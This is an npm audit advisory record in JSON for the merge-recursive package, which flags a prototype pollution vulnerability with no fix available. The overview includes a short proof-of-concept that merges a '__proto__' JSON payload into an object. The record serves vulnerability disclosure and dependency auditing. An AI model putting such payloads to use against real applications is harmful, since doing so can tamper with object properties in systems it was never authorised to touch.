{"type":"auditAdvisory","data":{"resolution":{"id":715,"path":"short-id>merge-recursive","dev":false,"bundled":false,"optional":false},"advisory":{"findings":[{"version":"0.0.3","paths":["short-id>merge-recursive"]}],"id":715,"created":"2018-10-17T22:37:07.509Z","updated":"2019-06-24T23:04:42.874Z","deleted":null,"title":"Prototype Pollution","found_by":{"link":"","name":"Olivier Arteau"},"reported_by":{"link":"","name":"Olivier Arteau"},"module_name":"merge-recursive","cves":[],"vulnerable_versions":">=0.0.0","patched_versions":"<0.0.0","overview":"All versions of `merge-recursive` are vulnerable to Prototype Pollution. When malicious user input is merged with another object it allows the attacker to modify the prototype of Object via `__proto__` causing the addition or modification of an existing property.\n\nProof of concept:\n\n```\nvar merge = require('merge-recursive').recursive;\nvar malicious_payload = '{\"__proto__\":{\"oops\":\"It works !\"}}';\n\nvar a = {};\nconsole.log(\"Before : \" + a.oops);\nmerge({}, JSON.parse(malicious_payload));\nconsole.log(\"After : \" + a.oops);\n```","recommendation":"There is currently no fix available. ","references":"- [HackerOne Report](https://hackerone.com/reports/311337)","access":"public","severity":"low","cwe":"CWE-471","metadata":{"module_type":"","exploitability":2,"affected_components":""},"url":"https://npmjs.com/advisories/715"}}}
